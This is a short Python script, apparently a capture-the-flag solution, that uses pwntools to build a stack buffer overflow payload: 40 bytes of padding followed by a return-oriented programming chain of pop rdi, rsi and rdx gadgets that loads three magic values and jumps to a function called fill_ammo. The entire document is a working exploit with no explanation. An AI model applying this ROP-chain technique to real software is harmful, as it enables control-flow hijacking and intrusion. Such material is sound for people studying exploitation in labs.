from pwn import *

# 0x000000000040159f : pop rdi ; ret
# 0x000000000040159b : pop rdx ; ret
# 0x000000000040159d : pop rsi ; ret
# 0x401588 c3              RET

ret = 0x401588
pop_rdi = 0x40159f
pop_rsi = 0x40159d
pop_rdx = 0x40159b
fill_ammo_addr = 0x4012f5

print(b"A"*40 + p64(ret) + p64(pop_rdi) + p64(0xdeadbeef) + p64(pop_rsi) + p64(0xdeadbabe) + p64(pop_rdx) + p64(0xdead1337) + p64(fill_ammo_addr))
